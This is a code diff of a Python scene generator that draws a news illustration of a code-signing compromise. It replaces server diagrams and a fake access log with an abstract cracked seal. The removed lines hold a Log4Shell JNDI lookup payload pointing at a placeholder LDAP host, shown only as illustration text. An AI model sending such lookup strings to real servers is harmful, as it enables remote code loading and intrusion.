@@ -1,137 +1,107 @@
-"""Code-signing infrastructure compromise: an exploited server becomes the way
-into the developer's build network, and the signing server's certificate
-and key are lifted out — whoever holds them can sign software as the vendor.
+"""Code signing as a seal of trust: the signature is drawn as a large wax seal
+with a check in it, and a crack runs through it when the sources say the
+signing infrastructure was compromised. A thin fuse along the floor leads to
+the seal through the stations the sources name on the way in (for example
+Log4Shell, then vCenter, then the build servers).
 
-Top left: the exploit request (a Log4Shell `${jndi:` lookup only when the
-sources name Log4Shell/Log4j). Below: three server elevations along the
-intrusion path (entry server -> build server -> signing server). Right: the
-code-signing certificate pulled out of the signing server. Product names
-appear only as plain-text labels when the sources name them."""
+Nothing is a screenshot: no access log, no request line, no host names, no
+certificate fields, no claim that keys were exported (unless the sources say
+so). Station labels are taken only from the source text."""
 from __future__ import annotations
 
+import math
 import random
 
 from ..brief import EditorialBrief
-from .. import type as T
-from ..kit import Box, Doc, Palette, arrow, background, icon, pill, vignette, window
+from ..kit import Box, Doc, W, H, f, icon
 from . import scene
 
-_ATTACK = ("exploited", "confirmed", "attacks_observed", "compromise")
+_ATTACK = ("exploited", "confirmed", "attacks_observed", "compromise", "suspected")
 
 
-def _server(doc: Doc, b: Box, label: str, *, units: int, led: str, hot: bool = False) -> None:
-    """Rack server, front elevation with a shallow top face (3/4 feel)."""
-    p = doc.pal
-    depth = 22
-    doc.add(f'<ellipse cx="{b.cx:.1f}" cy="{b.b + 14:.1f}" rx="{b.w * 0.52:.1f}" ry="12" fill="#000" '
-            f'opacity="0.6" filter="{doc.blur(10)}"/>')
-    # top face
-    doc.poly([(b.x, b.y), (b.x + depth * 1.6, b.y - depth), (b.r + depth * 1.6, b.y - depth), (b.r, b.y)],
-             doc.lin([(0, "#4A3A36", 1), (1, "#2C2220", 1)]))
-    doc.poly([(b.r, b.y), (b.r + depth * 1.6, b.y - depth), (b.r + depth * 1.6, b.b - depth), (b.r, b.b)],
-             "#1A1312")
-    # front panel
-    doc.rect(b.x, b.y, b.w, b.h, doc.lin([(0, "#3A2E2B", 1), (0.5, "#2A211F", 1), (1, "#1C1615", 1)]), 3,
-             stroke="#55443F", sw=1.2)
-    # rack ears with screws
-    for ex in (b.x, b.r - 22):
-        doc.rect(ex, b.y, 22, b.h, "#241C1A", 2)
-        for k in range(units):
-            doc.circle(ex + 11, b.y + (k + 0.5) * b.h / units, 4, "#0F0B0A", "#5D4B46", 1)
-    # drive bays
-    bays = int((b.w - 200) // 46)
-    for i in range(bays):
-        bx = b.x + 34 + i * 46
-        doc.rect(bx, b.y + 12, 40, b.h - 24, "#17110F", 3, stroke="#3E312D", sw=1)
-        for k in range(3):
-            doc.line((bx + 8, b.y + 22 + k * 6), (bx + 32, b.y + 22 + k * 6), "#3E312D", 1.4)
-        doc.circle(bx + 32, b.b - 22, 2.8, led if (i + units) % 3 else "#4ADE80", opacity=0.95)
-    # control area + label plate
-    cx = b.r - 156
-    doc.rect(cx, b.y + 14, 120, 26, "#E9DDD2", 3)
-    doc.text(T.fit(label, 15, 110, "mono_bold"), cx + 60, b.y + 32, 15, "#1F1715", "mono_bold", anchor="middle")
-    doc.circle(cx + 14, b.b - 20, 7, "#17110F", "#5D4B46", 1.4)
-    doc.circle(cx + 40, b.b - 20, 3.5, p.danger if hot else "#4ADE80")
-    for k in range(4):
-        doc.line((cx + 60 + k * 14, b.b - 28), (cx + 60 + k * 14, b.b - 12), "#14100E", 3)
+def _seal(doc: Doc, cx: float, cy: float, r: float, rng: random.Random, wax: str, crack: bool,
+          hot: str) -> None:
+    # ribbon tails behind the seal
+    for side in (-1, 1):
+        x0 = cx + side * r * 0.32
+        doc.poly([(x0 - r * 0.2, cy + r * 0.4), (x0 + r * 0.2, cy + r * 0.4),
+                  (x0 + side * r * 0.36 + r * 0.16, cy + r * 1.55), (x0 + side * r * 0.36, cy + r * 1.38),
+                  (x0 + side * r * 0.36 - r * 0.16, cy + r * 1.6)], "#7E1B16")
+    doc.add(f'<circle cx="{f(cx + 14)}" cy="{f(cy + 40)}" r="{f(r)}" fill="#000" opacity="0.35" '
+            f'filter="{doc.blur(26)}"/>')
+    # irregular wax rim
+    n = 90
+    pts = []
+    for i in range(n):
+        a = 2 * math.pi * i / n
+        rr = r * (1 + 0.035 * math.sin(a * 5 + 1.3) + 0.02 * (rng.random() - 0.5))
+        pts.append((cx + rr * math.cos(a), cy + rr * math.sin(a)))
+    doc.poly(pts, doc.rad([(0, "#E5483A", 1), (0.7, wax, 1), (1, "#6E1611", 1)], 0.38, 0.32, 0.75))
+    # pressed inner field and its rim
+    doc.circle(cx, cy, r * 0.74, doc.rad([(0, "#B4261C", 1), (1, "#8E1A13", 1)], 0.6, 0.7, 0.7))
+    doc.circle(cx, cy, r * 0.74, "none", "#F07A6A", r * 0.025, 0.55)
+    doc.circle(cx, cy, r * 0.64, "none", "#5E100C", r * 0.02, 0.6)
+    # the emblem: a check, the mark of a valid signature
+    k = r / 100
+    doc.path(f"M{f(cx - 34 * k)} {f(cy + 2 * k)}L{f(cx - 8 * k)} {f(cy + 28 * k)}L{f(cx + 38 * k)} {f(cy - 26 * k)}",
+             stroke="#5E100C", sw=16 * k, opacity=0.8)
+    doc.path(f"M{f(cx - 36 * k)} {f(cy - 2 * k)}L{f(cx - 10 * k)} {f(cy + 24 * k)}L{f(cx + 36 * k)} {f(cy - 30 * k)}",
+             stroke="#FFB3A8", sw=12 * k)
+    # highlight
+    doc.path(f"M{f(cx - r * 0.78)} {f(cy - r * 0.3)}A{f(r * 0.85)} {f(r * 0.85)} 0 0 1 {f(cx - r * 0.1)} "
+             f"{f(cy - r * 0.84)}", stroke="#FFFFFF", sw=r * 0.05, opacity=0.25)
+    if crack:
+        zig = [(cx - r * 0.18, cy - r * 1.02), (cx - r * 0.05, cy - r * 0.62), (cx - r * 0.2, cy - r * 0.3),
+               (cx + r * 0.06, cy + r * 0.02), (cx - r * 0.04, cy + r * 0.34), (cx + r * 0.18, cy + r * 0.64),
+               (cx + r * 0.08, cy + r * 1.03)]
+        d = "M" + "L".join(f"{f(x)} {f(y)}" for x, y in zig)
+        doc.glow(cx, cy, r * 0.22, r * 0.9, hot, 0.22)
+        doc.path(d, stroke="#14090A", sw=r * 0.07)
+        doc.path(d, stroke=hot, sw=r * 0.016)
 
 
-def _certificate(doc: Doc, pal: Palette, b: Box, subject: str) -> None:
-    """A code-signing certificate drawn as a document card with a seal."""
-    doc.shadow(b.x, b.y, b.w, b.h, 10, 1.2)
-    doc.rect(b.x, b.y, b.w, b.h, doc.lin([(0, "#FBF5EA", 1), (1, "#EFE4D2", 1)]), 10, stroke="#CDBA9C", sw=1.4)
-    doc.rect(b.x + 12, b.y + 12, b.w - 24, b.h - 24, "none", 6, stroke="#D8C6A8", sw=1)
-    ink, mute = "#2A201A", "#7C6A58"
-    doc.text("CODE SIGNING CERTIFICATE", b.x + 34, b.y + 54, 16, ink, "ui_bold", tracking=1.8)
-    rows = [("Subject", subject), ("Key usage", "Code Signing"), ("Private key", "present")]
-    for i, (k, v) in enumerate(rows):
-        y = b.y + 98 + i * 40
-        doc.text(k, b.x + 34, y, 15, mute, "ui")
-        doc.text(v, b.x + 150, y, 17, ink if i < 2 else pal.danger, "mono_bold" if i == 2 else "mono")
-        doc.line((b.x + 34, y + 12), (b.r - 120, y + 12), "#E2D4BC", 1)
-    # seal + ribbon
-    sx, sy = b.r - 70, b.b - 70
-    doc.poly([(sx - 16, sy + 10), (sx - 26, sy + 52), (sx - 8, sy + 42), (sx, sy + 58), (sx + 2, sy + 14)],
-             "#9E2A1E")
-    doc.poly([(sx + 16, sy + 10), (sx + 26, sy + 52), (sx + 8, sy + 42), (sx, sy + 58), (sx - 2, sy + 14)],
-             "#B7342A")
-    doc.circle(sx, sy, 34, doc.rad([(0, "#E5574A", 1), (1, "#A92A20", 1)]), "#7E1D15", 1.5)
-    doc.circle(sx, sy, 25, "none", "#FBD4C9", 1.4, 0.7)
-    icon(doc, "key", sx, sy, 26, "#FFF2EC", 2.2)
+def _stations(text: str) -> tuple[str, list[str]]:
+    """(entry, stations) named in the source text, in the order of the intrusion."""
+    entry = next((lab for k, lab in (("log4shell", "Log4Shell"), ("log4j", "Log4j")) if k in text), "")
+    stations = []
+    for k, lab in (("vcenter", "vCenter"), ("build", "build")):
+        if k in text:
+            stations.append(lab)
+    return entry, stations
 
 
 @scene("code_signing")
 def code_signing(doc: Doc, brief: EditorialBrief, rng: random.Random) -> None:
     p = doc.pal
-    background(doc, light=(0.72, 0.2), floor=640)
     text = brief.text or ""
-    taken = brief.status in _ATTACK or any(k in text for k in ("compromis", "hijack", "stole", "stolen"))
-    log4 = "log4shell" in text or "log4j" in text
-    entry = "vCenter" if "vcenter" in text else "app-server"
-    plate = "vcenter-01" if entry == "vCenter" else "app-01"
+    hot = "#FFB020"
+    crack = brief.status in _ATTACK or any(k in text for k in ("compromis", "hijack", "stole", "stolen"))
 
-    # ---- the exploit request
-    lw = Box(40, 64, 760, 196)
-    lb = window(doc, lw, title="access.log", surface="#140D0C", chrome="#211615", depth=0.8)
-    doc.text("POST /websso/SAML2/SSO HTTP/1.1" if entry == "vCenter" else "GET /login HTTP/1.1", lb.x + 26,
-             lb.y + 40, 18, p.muted, "mono")
-    doc.text("Host: " + ("vcenter.corp.example" if entry == "vCenter" else "app.corp.example"), lb.x + 26,
-             lb.y + 74, 18, p.muted, "mono")
-    hy = lb.y + 116
-    doc.rect(lb.x + 12, hy - 26, lb.w - 24, 38, p.danger, 4, opacity=0.18)
-    doc.rect(lb.x + 12, hy - 26, 4, 38, p.danger)
-    payload = "${jndi:ldap://203.0.113.9:1389/a}" if log4 else "<crafted request>"
-    w = doc.text("X-Forwarded-For: " if log4 else "body: ", lb.x + 26, hy, 19, p.ink, "mono")
-    doc.text(payload, lb.x + 26 + w, hy, 19, "#FFB49A", "mono_bold")
+    doc.rect(0, 0, W, H, doc.lin([(0, "#1C1110", 1), (1, "#0B0707", 1)]))
+    doc.rect(0, 0, W, H, doc.rad([(0, "#FF8A50", 0.16), (1, "#FF8A50", 0)], 0.64, 0.42, 0.5))
+    floor = 700.0
+    doc.rect(0, floor, W, H - floor, doc.lin([(0, "#000", 0.0), (1, "#000", 0.4)]))
 
-    # ---- the intrusion path across three servers
-    s1 = Box(70, 384, 520, 112)
-    s2 = Box(380, 610, 440, 76)
-    s3 = Box(1000, 590, 520, 150)
-    _server(doc, s1, plate, units=2, led="#F5A524", hot=True)
-    _server(doc, s2, "build-01", units=1, led="#F5A524", hot=taken)
-    _server(doc, s3, "sign-01", units=3, led="#F5A524", hot=taken)
-    arrow(doc, [(lb.x + 240, lw.b + 10), (lb.x + 240, s1.y - 34)], p.danger, sw=4, head=16)
-    if log4:
-        pill(doc, lb.x + 260, lw.b + 30, "Log4Shell", fg="#FFFFFF", bg=p.danger, size=15, font="ui_bold")
-    path_c = p.danger if taken else p.muted
-    arrow(doc, [(s1.r + 44, s1.cy - 10), (720, s1.cy - 10), (720, s2.y - 34)], path_c, sw=3, head=14,
-          dash="10 8", smooth=False)
-    arrow(doc, [(s2.r + 44, s2.cy - 6), (s3.x - 12, s2.cy - 6)], path_c, sw=3, head=14, dash="10 8")
+    scx, scy, sr = 1030.0, 370.0, 270.0
+    entry, stations = _stations(text)
 
-    # ---- the certificate, lifted out of the signing server
-    cert = Box(1010, 150, 500, 290)
-    if taken:
-        # empty slot where it sat + the lift
-        doc.rect(s3.x + 120, s3.y - 22 + 4, 300, 8, "#000", 3, opacity=0.5)
-        arrow(doc, [(s3.cx - 10, s3.y - 30), (s3.cx - 10, cert.b + 26)], p.danger, sw=5, head=20)
-        doc.text("certificate + key exported", s3.cx + 14, (s3.y + cert.b) / 2 + 8, 17, "#FFB49A", "mono_bold")
-        with doc.g(transform=f"rotate(-5 {cert.cx:.1f} {cert.cy:.1f})"):
-            _certificate(doc, p, cert, "CN=Software Vendor LLC")
-    else:
-        with doc.g(opacity=0.85):
-            _certificate(doc, p, cert, "CN=Software Vendor LLC")
-        pill(doc, cert.cx, cert.b + 24, "exposed", fg="#FFFFFF", bg=p.warn, size=15, anchor="middle")
+    # the fuse along the floor: entry -> stations -> the seal
+    nodes = [(380.0 + i * 250, floor) for i in range(len(stations))]
+    pts = [(0.0, floor)] + nodes + [(scx - sr - 150, floor)]
+    d = "M" + "L".join(f"{f(x)} {f(y)}" for x, y in pts)
+    d += f"Q{f(scx - sr - 40)} {f(floor)} {f(scx - sr * 0.9)} {f(scy + sr * 0.38)}"
+    if crack:
+        doc.path(d, stroke=p.danger, sw=14, opacity=0.18)
+    doc.path(d, stroke=p.danger if crack else p.muted, sw=5, dash="" if crack else "8 10")
+    for (x, y), lab in zip(nodes, stations):
+        doc.circle(x, y, 52, "#1F1514", p.danger if crack else p.muted, 4)
+        icon(doc, "server", x, y, 52, p.ink, 2.6)
+        doc.text(lab, x, y + 104, 40, p.ink, "ui_bold", anchor="middle")
+    if entry:
+        doc.text(entry, 40, floor - 36, 56, p.danger if crack else p.muted, "ui_bold")
 
-    vignette(doc, 0.5)
-    doc.focus = Box(560, 120, 1000, 640)
+    _seal(doc, scx, scy, sr, rng, "#B3261C", crack, hot)
+    doc.text("code signing", scx, scy + sr * 1.82, 46, p.ink, "ui_bold", anchor="middle", opacity=0.85)
+
+    doc.rect(0, 0, W, H, doc.rad([(0.62, "#000", 0), (1, "#000", 0.5)], 0.5, 0.5, 0.78))
+    doc.focus = Box(0, 82, 1400, 788)
